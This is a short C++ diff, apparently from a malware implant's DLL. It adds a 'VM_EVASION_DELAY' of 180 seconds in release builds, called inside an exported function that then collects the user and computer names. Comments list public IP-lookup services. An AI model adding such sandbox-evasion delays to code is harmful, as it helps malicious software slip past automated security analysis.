@@ -46,7 +46,11 @@ using namespace std;
 //http://icanhazip.com/
 //http://ip-api.com/line/
 
-
+#ifdef _DEBUG
+#define VM_EVASION_DELAY	3
+#else
+#define VM_EVASION_DELAY	180
+#endif
 
 
 extern "C" __declspec(dllexport) int __stdcall LittleBear()
@@ -84,6 +88,8 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 	}
 
 	iRet = furtherApi();
+
+	iRet = delay(VM_EVASION_DELAY);
 
 	//need to get computer info before write log file
 	iRet = GetUserAndComputerName(strUserName, strComputerName);
